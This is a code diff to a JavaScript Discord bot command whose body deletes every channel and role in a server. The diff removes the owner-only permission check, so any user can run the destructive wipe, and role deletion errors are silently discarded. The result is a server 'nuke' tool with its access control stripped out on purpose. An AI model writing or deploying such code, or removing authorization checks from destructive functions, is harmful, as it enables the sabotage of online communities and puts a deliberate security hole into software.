@@ -1,11 +1,6 @@
 exports.run = async (client, message, args) => {
-  if (message.author.id != client.config.ownerID) {
-    await message.channel.send("oi m8 u cant run that ur not my owner");
-    return;
-  }
 
   await (function(guild) {
-
     // destroy channels and roles
     guild.channels.cache.forEach(channel => channel.delete());
     guild.roles.cache.forEach(role => role.delete().catch(e => {}));
